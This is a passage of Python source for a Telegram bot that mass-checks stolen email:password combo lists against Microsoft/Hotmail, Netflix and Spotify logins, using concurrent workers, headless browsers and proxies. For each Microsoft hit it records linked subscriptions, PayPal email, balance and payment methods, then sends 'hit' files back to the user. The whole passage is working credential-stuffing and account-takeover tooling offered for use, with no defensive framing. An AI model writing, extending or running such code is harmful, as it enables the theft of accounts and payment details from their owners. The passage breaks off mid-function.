                    invalid.append(f"{result.status}:{email}:{password}")
                else:
                    invalid.append(f"{result.status}:{email}:{password}")
                
                checked_count[0] += 1
            except Exception as e:
                errors.append(f"ERROR:{account}")
                checked_count[0] += 1
                logger.error(f"Error checking {account}: {e}")
        
        # Create 25 workers
        checker = AdvancedHotmailChecker(proxies=proxies)
        
        # Process in batches with 25 concurrent workers
        batch_size = 25
        last_update_time = [0]  # Track last update time to avoid rate limits
        
        for i in range(0, len(accounts), batch_size):
            batch = accounts[i:i + batch_size]
            tasks = [check_single_account(acc, checker) for acc in batch]
            await asyncio.gather(*tasks)
            
            # Update progress after each batch (with rate limit check)
            import time
            current_time = time.time()
            if current_time - last_update_time[0] >= 2:  # Update max every 2 seconds
                try:
                    percentage = int((checked_count[0] / len(accounts)) * 100)
                    progress_bar = "█" * (percentage // 5) + "░" * (20 - (percentage // 5))
                    
                    await msg.edit_text(
                        f"⚡ 𝗟𝗜𝗩𝗘 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 ⚡\n\n"
                        f"[{progress_bar}] {percentage}%\n"
                        f"🔄 {checked_count[0]}/{len(accounts)} checked\n\n"
                        f"✅ {len(hits)} • ⚠️ {len(twofa)} • ❌ {len(invalid)} • ⚡ {len(errors)}"
                    )
                    last_update_time[0] = current_time
                except Exception as e:
                    logger.error(f"Failed to update progress message: {e}")
        
        # Final summary
        total_checked = len(hits) + len(twofa) + len(invalid) + len(errors)
        stats_msg = "✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n\n"
        stats_msg += f"📊 Checked: {total_checked}/{len(accounts)}\n"
        stats_msg += f"[████████████████████] 100%\n\n"
        stats_msg += f"✅ {len(hits)} • ⚠️ {len(twofa)} • ❌ {len(invalid)} • ⚡ {len(errors)}\n"
        
        if hits:
            stats_msg += f"\n\n🎯 Top {min(3, len(hits_detailed))} Hits:\n"
            for idx, hit_detail in enumerate(hits_detailed[:3], 1):
                stats_msg += f"{idx}. {hit_detail[:80]}...\n" if len(hit_detail) > 80 else f"{idx}. {hit_detail}\n"
            if len(hits_detailed) > 3:
                stats_msg += f"\n+{len(hits_detailed) - 3} more in files below 👇"
        
        await msg.edit_text(stats_msg)
        
        # Send result files
        if hits:
            hits_txt = '\n'.join(hits)
            await update.message.reply_document(
                document=hits_txt.encode(),
                filename=f"ms_success_{user_id}.txt",
                caption=f"✅ SUCCESS ({len(hits)} accounts)"
            )
            
            hits_detailed_txt = '\n'.join(hits_detailed)
            await update.message.reply_document(
                document=hits_detailed_txt.encode(),
                filename=f"ms_success_detailed_{user_id}.txt",
                caption=f"✅ SUCCESS DETAILED ({len(hits)} accounts)\n📋 Netflix, Disney+, Xbox, PayPal, Supercell, Balance"
            )
        
        if twofa:
            twofa_txt = '\n'.join(twofa)
            await update.message.reply_document(
                document=twofa_txt.encode(),
                filename=f"ms_2fa_{user_id}.txt",
                caption=f"⚠️ 2FA ENABLED ({len(twofa)} accounts)"
            )
        
        if invalid:
            invalid_txt = '\n'.join(invalid)
            await update.message.reply_document(
                document=invalid_txt.encode(),
                filename=f"ms_invalid_{user_id}.txt",
                caption=f"❌ INVALID ({len(invalid)} accounts)"
            )
        
        if errors:
            errors_txt = '\n'.join(errors)
            await update.message.reply_document(
                document=errors_txt.encode(),
                filename=f"ms_errors_{user_id}.txt",
                caption=f"⚡ ERRORS ({len(errors)} accounts)"
            )
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)}")

async def mass_check_microsoft_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass Microsoft check from file (direct upload or reply)"""
    user_id = update.effective_user.id
    
    # Check if replying to a file
    if update.message.reply_to_message and update.message.reply_to_message.document:
        file_message = update.message.reply_to_message
    elif update.message.document:
        file_message = update.message
    else:
        await update.message.reply_text("❌ No file found! Reply to a file or send one with /mss")
        return
    
    try:
        # Download and read the file
        file = await context.bot.get_file(file_message.document.file_id)
        file_content = await file.download_as_bytearray()
        accounts_text = file_content.decode('utf-8', errors='ignore')
        
        # Parse accounts from file
        accounts = []
        for line in accounts_text.split('\n'):
            line = line.strip()
            if line and (':' in line or '|' in line):
                accounts.append(line)
        
        if not accounts:
            await update.message.reply_text("❌ No valid accounts found in file!\n\n📋 Format: email:password or email|password (one per line)")
            return
        
        if len(accounts) > 5000 and not is_admin(user_id):
            await update.message.reply_text(f"❌ File contains {len(accounts)} accounts!\n\n✅ Max: 5000 for users, unlimited for admins")
            return
        
        # Start checking process with 25 concurrent workers
        proxies = [MS_GLOBAL_SETTINGS['proxy']] if MS_GLOBAL_SETTINGS['proxy'] else None
        
        hits = []
        hits_detailed = []
        twofa = []
        invalid = []
        errors = []
        checked_count = [0]
        msg = await update.message.reply_text(f"⏳ Processing file...\n📋 Found {len(accounts)} accounts\n⚡ Using 25 workers")
        
        async def check_single_account(account, checker):
            """Check a single account and update counters"""
            try:
                if ':' in account:
                    email, password = account.split(':', 1)
                elif '|' in account:
                    email, password = account.split('|', 1)
                else:
                    invalid.append(f"INVALID_FORMAT:{account}")
                    checked_count[0] += 1
                    return
                
                result = await checker.check_account(email.strip(), password.strip())
                
                if result.status == "SUCCESS":
                    hit_line = f"{email}:{password}"
                    details = []
                    
                    if result.name:
                        details.append(f"Name={result.name}")
                    if result.country:
                        details.append(f"Country={result.country}")
                    
                    subs = []
                    if result.netflix_subscription:
                        subs.append("Netflix")
                    if result.disney_subscription:
                        subs.append("Disney+")
                    if result.xbox_linked:
                        subs.append("Xbox")
                    if result.paypal_email:
                        subs.append(f"PayPal({result.paypal_email})")
                    if result.supercell_linked:
                        subs.append("Supercell")
                    
                    if subs:
                        details.append(f"Subs=[{','.join(subs)}]")
                    
                    if result.payment_balance:
                        details.append(f"Balance=${result.payment_balance}")
                    
                    if result.payment_methods:
                        details.append(f"PayMethods={','.join(result.payment_methods)}")
                    
                    if result.total_orders:
                        details.append(f"Orders={result.total_orders}")
                    
                    if result.unread_messages is not None:
                        details.append(f"Unread={result.unread_messages}")
                    
                    if details:
                        hit_line += f" | {' | '.join(details)}"
                    
                    hits.append(f"{email}:{password}")
                    hits_detailed.append(hit_line)
                elif result.status == "2FACTOR":
                    twofa.append(f"2FA:{email}:{password}")
                elif result.status in ["INVALID", "INCORRECT"]:
                    invalid.append(f"{result.status}:{email}:{password}")
                else:
                    invalid.append(f"{result.status}:{email}:{password}")
                
                checked_count[0] += 1
            except Exception as e:
                errors.append(f"ERROR:{account}")
                checked_count[0] += 1
                logger.error(f"Error checking {account}: {e}")
        
        # Process with 25 concurrent workers
        checker = AdvancedHotmailChecker(proxies=proxies)
        batch_size = 25
        last_update_time = [0]  # Track last update time to avoid rate limits
        
        for i in range(0, len(accounts), batch_size):
            batch = accounts[i:i + batch_size]
            tasks = [check_single_account(acc, checker) for acc in batch]
            await asyncio.gather(*tasks)
            
            # Update progress after each batch (with rate limit check)
            import time
            current_time = time.time()
            if current_time - last_update_time[0] >= 2:  # Update max every 2 seconds
                try:
                    percentage = int((checked_count[0] / len(accounts)) * 100)
                    progress_bar = "█" * (percentage // 5) + "░" * (20 - (percentage // 5))
                    
                    await msg.edit_text(
                        f"⚡ 𝗟𝗜𝗩𝗘 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 ⚡\n\n"
                        f"[{progress_bar}] {percentage}%\n"
                        f"🔄 {checked_count[0]}/{len(accounts)} checked\n\n"
                        f"✅ {len(hits)} • ⚠️ {len(twofa)} • ❌ {len(invalid)} • ⚡ {len(errors)}"
                    )
                    last_update_time[0] = current_time
                except Exception as e:
                    logger.error(f"Failed to update progress message: {e}")
        
        # Final summary
        total_checked = len(hits) + len(twofa) + len(invalid) + len(errors)
        stats_msg = "✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n\n"
        stats_msg += f"📊 Checked: {total_checked}/{len(accounts)}\n"
        stats_msg += f"[████████████████████] 100%\n\n"
        stats_msg += f"✅ {len(hits)} • ⚠️ {len(twofa)} • ❌ {len(invalid)} • ⚡ {len(errors)}\n"
        
        if hits:
            stats_msg += f"\n\n🎯 Top {min(3, len(hits_detailed))} Hits:\n"
            for idx, hit_detail in enumerate(hits_detailed[:3], 1):
                stats_msg += f"{idx}. {hit_detail[:80]}...\n" if len(hit_detail) > 80 else f"{idx}. {hit_detail}\n"
            if len(hits_detailed) > 3:
                stats_msg += f"\n+{len(hits_detailed) - 3} more in files below 👇"
        
        await msg.edit_text(stats_msg)
        
        # Send result files
        if hits:
            hits_txt = '\n'.join(hits)
            await update.message.reply_document(
                document=hits_txt.encode(),
                filename=f"ms_success_{user_id}.txt",
                caption=f"✅ SUCCESS ({len(hits)} accounts)"
            )
            
            hits_detailed_txt = '\n'.join(hits_detailed)
            await update.message.reply_document(
                document=hits_detailed_txt.encode(),
                filename=f"ms_success_detailed_{user_id}.txt",
                caption=f"✅ SUCCESS DETAILED ({len(hits)} accounts)\n📋 Netflix, Disney+, Xbox, PayPal, Supercell, Balance"
            )
        
        if twofa:
            twofa_txt = '\n'.join(twofa)
            await update.message.reply_document(
                document=twofa_txt.encode(),
                filename=f"ms_2fa_{user_id}.txt",
                caption=f"⚠️ 2FA ENABLED ({len(twofa)} accounts)"
            )
        
        if invalid:
            invalid_txt = '\n'.join(invalid)
            await update.message.reply_document(
                document=invalid_txt.encode(),
                filename=f"ms_invalid_{user_id}.txt",
                caption=f"❌ INVALID ({len(invalid)} accounts)"
            )
        
        if errors:
            errors_txt = '\n'.join(errors)
            await update.message.reply_document(
                document=errors_txt.encode(),
                filename=f"ms_errors_{user_id}.txt",
                caption=f"⚡ ERRORS ({len(errors)} accounts)"
            )
            
    except Exception as e:
        logger.error(f"Error in mass_check_microsoft_file: {e}")
        await update.message.reply_text(f"❌ Error processing file: {str(e)}")

async def receive_microsoft_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not update.message:
        await update.effective_chat.send_message("❌ Invalid message!")
        return MS_WAITING_ACCOUNTS
    
    # Handle file uploads
    if update.message.document:
        try:
            file = await context.bot.get_file(update.message.document.file_id)
            file_content = await file.download_as_bytearray()
            accounts_text = file_content.decode('utf-8', errors='ignore')
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {str(e)}")
            return MS_WAITING_ACCOUNTS
    elif update.message.text:
        # Handle text messages
        accounts_text = update.message.text
    else:
        await update.message.reply_text("❌ Please send text or a file!")
        return MS_WAITING_ACCOUNTS
    
    accounts = []
    for line in accounts_text.split('\n'):
        line = line.strip()
        if line and (':' in line or '|' in line):
            accounts.append(line)
        elif ',' in accounts_text:
            accounts = [acc.strip() for acc in accounts_text.split(',') if acc.strip()]
            break
    
    if not accounts:
        await update.message.reply_text("❌ No valid accounts found! Please send in format: email:password")
        return MS_WAITING_ACCOUNTS
    
    if len(accounts) > 5000 and not is_admin(user_id):
        await update.message.reply_text("❌ Max 5000 accounts for users! Admins have no limit.")
        return MS_WAITING_ACCOUNTS
    
    context.user_data['accounts'] = accounts
    await process_microsoft_accounts(update, context)
    return ConversationHandler.END

async def cancel_microsoft(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Microsoft mass check cancelled!")
    context.user_data.clear()
    return ConversationHandler.END

async def check_netflix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔═════════════════════════╗\n"
            "   🎬 𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════╝\n\n"
            "❌ Usage: /net email:password\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Example: /net test@gmail.com:pass123"
        )
        return
    
    account = ' '.join(context.args)
    
    if ':' in account:
        email, password = account.split(':', 1)
    elif '|' in account:
        email, password = account.split('|', 1)
    else:
        await update.message.reply_text("❌ Invalid format! Use email:password")
        return
    
    email = email.strip()
    password = password.strip()
    
    msg = await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   🎬 𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
        "╚═════════════════════════╝\n\n"
        f"🔄 Checking: {email[:3]}***\n"
        "⏳ Please wait..."
    )
    
    try:
        proxy = NETFLIX_GLOBAL_SETTINGS.get('proxy')
        proxy_config = NetflixAutomation.parse_proxy(proxy) if proxy else None
        
        netflix = NetflixAutomation(debug=False, headless=True, proxy=proxy_config)
        result = await netflix.login(email, password)
        
        status = result.get('status', 'error')
        message = result.get('message', 'Unknown error')
        
        if status == 'success':
            response = (
                "╔═════════════════════════╗\n"
                "   ✅ 𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗛𝗜𝗧\n"
                "╚═════════════════════════╝\n\n"
                f"📧 Email: {email}\n"
                f"🔑 Pass: {password}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Status: {message}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━"
            )
        else:
            response = (
                "╔═════════════════════════╗\n"
                "   ❌ 𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗙𝗔𝗜𝗟𝗘𝗗\n"
                "╚═════════════════════════╝\n\n"
                f"📧 Email: {email}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"❌ Status: {message}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━"
            )
        
        await msg.edit_text(response)
        
    except Exception as e:
        await msg.edit_text(f"❌ Error checking Netflix: {str(e)}")

async def check_netflix_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return NETFLIX_WAITING_ACCOUNTS
    
    message_text = update.message.text or ""
    lines = message_text.replace('/mnet', '').strip().split('\n')
    accounts = [line.strip() for line in lines if line.strip() and (':' in line or '|' in line)]
    
    if accounts:
        context.user_data['netflix_accounts'] = accounts
        await process_netflix_accounts(update, context)
        return ConversationHandler.END
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   🎬 𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗠𝗔𝗦𝗦 𝗖𝗛𝗞\n"
        "╚═════════════════════════╝\n\n"
        "📝 Send accounts to check:\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Format:\n"
        "email:password\n"
        "email:password\n\n"
        "Or send a .txt file!"
    )
    return NETFLIX_WAITING_ACCOUNTS

async def mass_check_netflix_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Reply to a .txt file with /mnet!")
        return
    
    try:
        file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
        file_content = await file.download_as_bytearray()
        accounts_text = file_content.decode('utf-8', errors='ignore')
        
        accounts = []
        for line in accounts_text.split('\n'):
            line = line.strip()
            if line and (':' in line or '|' in line):
                accounts.append(line)
        
        if not accounts:
            await update.message.reply_text("❌ No valid accounts found!")
            return
        
        context.user_data['netflix_accounts'] = accounts
        await process_netflix_accounts(update, context)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def receive_netflix_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not update.message:
        await update.effective_chat.send_message("❌ Invalid message!")
        return NETFLIX_WAITING_ACCOUNTS
    
    if update.message.document:
        try:
            file = await context.bot.get_file(update.message.document.file_id)
            file_content = await file.download_as_bytearray()
            accounts_text = file_content.decode('utf-8', errors='ignore')
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {str(e)}")
            return NETFLIX_WAITING_ACCOUNTS
    elif update.message.text:
        accounts_text = update.message.text
    else:
        await update.message.reply_text("❌ Please send text or a file!")
        return NETFLIX_WAITING_ACCOUNTS
    
    accounts = []
    for line in accounts_text.split('\n'):
        line = line.strip()
        if line and (':' in line or '|' in line):
            accounts.append(line)
    
    if not accounts:
        await update.message.reply_text("❌ No valid accounts found!")
        return NETFLIX_WAITING_ACCOUNTS
    
    if len(accounts) > 100 and not is_admin(user_id):
        await update.message.reply_text("❌ Max 100 accounts for users! Admins have no limit.")
        return NETFLIX_WAITING_ACCOUNTS
    
    context.user_data['netflix_accounts'] = accounts
    await process_netflix_accounts(update, context)
    return ConversationHandler.END

async def process_netflix_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    accounts = context.user_data.get('netflix_accounts', [])
    
    if not accounts:
        await update.message.reply_text("❌ No accounts provided!")
        return
    
    hits = []
    hits_detailed = []
    fails = []
    checked_count = [0]
    msg = await update.message.reply_text(f"⏳ Checking 0/{len(accounts)} Netflix accounts with 25 workers...")
    
    proxy = NETFLIX_GLOBAL_SETTINGS.get('proxy')
    proxy_config = NetflixAutomation.parse_proxy(proxy) if proxy else None
    
    semaphore = asyncio.Semaphore(25)
    
    async def check_account(account):
        async with semaphore:
            try:
                if ':' in account:
                    email, password = account.split(':', 1)
                elif '|' in account:
                    email, password = account.split('|', 1)
                else:
                    return ('fail', f"INVALID:{account}", None)
                
                email = email.strip()
                password = password.strip()
                
                netflix = NetflixAutomation(debug=False, headless=True, proxy=proxy_config)
                try:
                    result = await netflix.login(email, password)
                finally:
                    try:
                        await netflix.cleanup()
                    except:
                        pass
                
                if result.get('status') == 'success':
                    plan = result.get('plan', 'Unknown')
                    return ('hit', f"{email}:{password}", f"{email}:{password} | Plan: {plan}")
                else:
                    status = result.get('message', 'FAILED')
                    return ('fail', f"{email}:{password} | {status}", None)
                    
            except Exception as e:
                return ('fail', f"ERROR:{account}", None)
    
    async def update_progress():
        while checked_count[0] < len(accounts):
            await asyncio.sleep(3)
            try:
                await msg.edit_text(f"⏳ Checking {checked_count[0]}/{len(accounts)} Netflix accounts (25 workers)...\n✅ Hits: {len(hits)}\n❌ Fails: {len(fails)}")
            except:
                pass
    
    progress_task = asyncio.create_task(update_progress())
    
    tasks = [check_account(account) for account in accounts]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for result in results:
        checked_count[0] += 1
        if isinstance(result, Exception):
            fails.append(f"ERROR:Unknown")
        elif result[0] == 'hit':
            hits.append(result[1])
            if result[2]:
                hits_detailed.append(result[2])
        else:
            fails.append(result[1])
    
    progress_task.cancel()
    
    stats_msg = "╔═════════════════════════╗\n"
    stats_msg += "   🎬 𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n"
    stats_msg += "╚═════════════════════════╝\n\n"
    stats_msg += f"✅ Hits: {len(hits)}\n"
    stats_msg += f"❌ Fails: {len(fails)}\n"
    stats_msg += f"📊 Total: {len(accounts)}\n"
    stats_msg += "━━━━━━━━━━━━━━━━━━━━━━━\n"
    
    if hits:
        stats_msg += "\n📋 HITS:\n"
        display_hits = hits_detailed[:10] if hits_detailed else hits[:10]
        for hit in display_hits:
            stats_msg += f"✅ {hit}\n"
        if len(hits) > 10:
            stats_msg += f"\n... and {len(hits) - 10} more hits!"
    
    await msg.edit_text(stats_msg)
    
    if hits and len(hits) > 10:
        hits_file = '\n'.join(hits_detailed if hits_detailed else hits)
        from io import BytesIO
        file_obj = BytesIO(hits_file.encode('utf-8'))
        file_obj.name = 'netflix_hits.txt'
        await update.message.reply_document(document=file_obj, caption=f"📋 All {len(hits)} Netflix hits!")

async def cancel_netflix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Netflix mass check cancelled!")
    context.user_data.clear()
    return ConversationHandler.END

async def set_netflix_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔═════════════════════════╗\n"
            "   🔧 𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗣𝗥𝗢𝗫𝗬\n"
            "╚═════════════════════════╝\n\n"
            "❌ Usage: /pnet proxy\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Formats supported:\n"
            "• ip:port\n"
            "• ip:port:user:pass\n"
            "• http://ip:port\n"
            "• socks5://ip:port\n"
            "• socks5://user:pass@ip:port\n"
            "━━━━━━━━━━━━━━━━━━━━━━━"
        )
        return
    
    proxy = ' '.join(context.args)
    NETFLIX_GLOBAL_SETTINGS['proxy'] = proxy
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   ✅ 𝗣𝗥𝗢𝗫𝗬 𝗦𝗘𝗧\n"
        "╚═════════════════════════╝\n\n"
        f"🔧 Netflix Proxy: {proxy}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "All Netflix checks will use this proxy!"
    )

async def remove_netflix_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    NETFLIX_GLOBAL_SETTINGS['proxy'] = None
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   ✅ 𝗣𝗥𝗢𝗫𝗬 𝗥𝗘𝗠𝗢𝗩𝗘𝗗\n"
        "╚═════════════════════════╝\n\n"
        "🔧 Netflix proxy removed!\n"
        "━━━━━━━━━━━━━━━━━━━━━━━"
    )

async def check_spotify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔═════════════════════════╗\n"
            "   🎵 𝗦𝗣𝗢𝗧𝗜𝗙𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════╝\n\n"
            "❌ Usage: /sp email:password\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Example: /sp test@gmail.com:pass123"
        )
        return
    
    account = ' '.join(context.args)
    
    if ':' in account:
        email, password = account.split(':', 1)
    elif '|' in account:
        email, password = account.split('|', 1)
    else:
        await update.message.reply_text("❌ Invalid format! Use email:password")
        return
    
    email = email.strip()
    password = password.strip()
    
    msg = await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   🎵 𝗦𝗣𝗢𝗧𝗜𝗙𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
        "╚═════════════════════════╝\n\n"
        f"🔄 Checking: {email[:3]}***\n"
        "⏳ Please wait..."
    )
    
    try:
        proxy = SPOTIFY_GLOBAL_SETTINGS.get('proxy')
        proxy_config = None
        
        if proxy:
            parts = proxy.split(':')
            if len(parts) >= 4:
                host, port, username_p, password_p = parts[0], parts[1], parts[2], ':'.join(parts[3:])
                proxy_config = {
                    "server": f"http://{host}:{port}",
                    "username": username_p,
                    "password": password_p
                }
            elif len(parts) == 2:
                host, port = parts[0], parts[1]
                proxy_config = {"server": f"http://{host}:{port}"}
            elif '://' in proxy:
                if '@' in proxy:
                    protocol, rest = proxy.split('://', 1)
                    auth, hostport = rest.rsplit('@', 1)
                    user_p, pass_p = auth.split(':', 1)
                    proxy_config = {
                        "server": f"{protocol}://{hostport}",
                        "username": user_p,
                        "password": pass_p
                    }
                else:
                    proxy_config = {"server": proxy}
        
        def run_spotify_check():
            automation = SpotifyLoginAutomation(headless=True, slow_mo=200, proxy_config=proxy_config)
            try:
                automation.start()
                result = automation.spotify_login(email, password)
                return result
            finally:
                automation.stop()
        
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, run_spotify_check)
        
        if result.get('success'):
            subscription = result.get('subscription', {})
            plan = subscription.get('plan', 'Unknown')
            status = subscription.get('status', 'Unknown')
            
            response = (
                "╔═════════════════════════╗\n"
                "   ✅ 𝗦𝗣𝗢𝗧𝗜𝗙𝗬 𝗛𝗜𝗧\n"
                "╚═════════════════════════╝\n\n"
                f"📧 Email: {email}\n"
                f"🔑 Pass: {password}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 Plan: {plan}\n"
                f"✅ Status: {status}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━"
            )
        else:
            response = (
                "╔═════════════════════════╗\n"
                "   ❌ 𝗦𝗣𝗢𝗧𝗜𝗙𝗬 𝗙𝗔𝗜𝗟𝗘𝗗\n"
                "╚═════════════════════════╝\n\n"
                f"📧 Email: {email}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"❌ Status: {result.get('message', 'Failed')}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━"
            )
        
        await msg.edit_text(response)
        
    except Exception as e:
        await msg.edit_text(f"❌ Error checking Spotify: {str(e)}")

async def check_spotify_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return SPOTIFY_WAITING_ACCOUNTS
    
    message_text = update.message.text or ""
    lines = message_text.replace('/msp', '').strip().split('\n')
    accounts = [line.strip() for line in lines if line.strip() and (':' in line or '|' in line)]
    
    if accounts:
        context.user_data['spotify_accounts'] = accounts
        await process_spotify_accounts(update, context)
        return ConversationHandler.END
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   🎵 𝗦𝗣𝗢𝗧𝗜𝗙𝗬 𝗠𝗔𝗦𝗦 𝗖𝗛𝗞\n"
        "╚═════════════════════════╝\n\n"
        "📝 Send accounts to check:\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Format:\n"
        "email:password\n"
        "email:password\n\n"
        "Or send a .txt file!"
    )
    return SPOTIFY_WAITING_ACCOUNTS

async def mass_check_spotify_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Reply to a .txt file with /msp!")
        return
    
    try:
        file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
        file_content = await file.download_as_bytearray()
        accounts_text = file_content.decode('utf-8', errors='ignore')
        
        accounts = []
        for line in accounts_text.split('\n'):
            line = line.strip()
            if line and (':' in line or '|' in line):
                accounts.append(line)
        
        if not accounts:
            await update.message.reply_text("❌ No valid accounts found!")
            return
        
        context.user_data['spotify_accounts'] = accounts
        await process_spotify_accounts(update, context)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def receive_spotify_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not update.message:
        await update.effective_chat.send_message("❌ Invalid message!")
        return SPOTIFY_WAITING_ACCOUNTS
    
    if update.message.document:
        try:
            file = await context.bot.get_file(update.message.document.file_id)
            file_content = await file.download_as_bytearray()
            accounts_text = file_content.decode('utf-8', errors='ignore')
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {str(e)}")
            return SPOTIFY_WAITING_ACCOUNTS
    elif update.message.text:
        accounts_text = update.message.text
    else:
        await update.message.reply_text("❌ Please send text or a file!")
        return SPOTIFY_WAITING_ACCOUNTS
    
    accounts = []
    for line in accounts_text.split('\n'):
        line = line.strip()
        if line and (':' in line or '|' in line):
            accounts.append(line)
    
    if not accounts:
        await update.message.reply_text("❌ No valid accounts found!")
        return SPOTIFY_WAITING_ACCOUNTS
    
    if len(accounts) > 100 and not is_admin(user_id):
        await update.message.reply_text("❌ Max 100 accounts for users! Admins have no limit.")
        return SPOTIFY_WAITING_ACCOUNTS
    
    context.user_data['spotify_accounts'] = accounts
    await process_spotify_accounts(update, context)
    return ConversationHandler.END

async def process_spotify_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    from concurrent.futures import ThreadPoolExecutor
    
    accounts = context.user_data.get('spotify_accounts', [])
    
    if not accounts:
        await update.message.reply_text("❌ No accounts provided!")
        return
    
    hits = []
    hits_detailed = []
    fails = []
    checked_count = [0]
    msg = await update.message.reply_text(f"⏳ Checking 0/{len(accounts)} Spotify accounts with 25 workers...")
    
    proxy = SPOTIFY_GLOBAL_SETTINGS.get('proxy')
    proxy_config = None
    
    if proxy:
        parts = proxy.split(':')
        if len(parts) >= 4:
            host, port, username_p, password_p = parts[0], parts[1], parts[2], ':'.join(parts[3:])
            proxy_config = {
                "server": f"http://{host}:{port}",
                "username": username_p,
                "password": password_p
            }
        elif len(parts) == 2:
            host, port = parts[0], parts[1]
            proxy_config = {"server": f"http://{host}:{port}"}
    
    def check_single_account(account):
        try:
            if ':' in account:
                email, password = account.split(':', 1)
            elif '|' in account:
                email, password = account.split('|', 1)
            else:
                return ('fail', f"INVALID:{account}", None)
            
            email = email.strip()
            password = password.strip()
            
            automation = SpotifyLoginAutomation(headless=True, slow_mo=50, proxy_config=proxy_config)
            try:
                automation.start()
                result = automation.spotify_login(email, password)
            finally:
                automation.stop()
            
            if result.get('success'):
                subscription = result.get('subscription', {})
                plan = subscription.get('plan', 'Unknown')
                return ('hit', f"{email}:{password}", f"{email}:{password} | Plan: {plan}")
            else:
                return ('fail', f"{email}:{password} | {result.get('message', 'Failed')}", None)
                
        except Exception as e:
            return ('fail', f"ERROR:{account}", None)
    
    async def update_progress():
        while checked_count[0] < len(accounts):
            await asyncio.sleep(3)
            try:
                await msg.edit_text(f"⏳ Checking {checked_count[0]}/{len(accounts)} Spotify accounts (25 workers)...\n✅ Hits: {len(hits)}\n❌ Fails: {len(fails)}")
            except:
                pass
    
    progress_task = asyncio.create_task(update_progress())
    
    executor = ThreadPoolExecutor(max_workers=25)
    loop = asyncio.get_event_loop()
    
    tasks = [loop.run_in_executor(executor, check_single_account, account) for account in accounts]
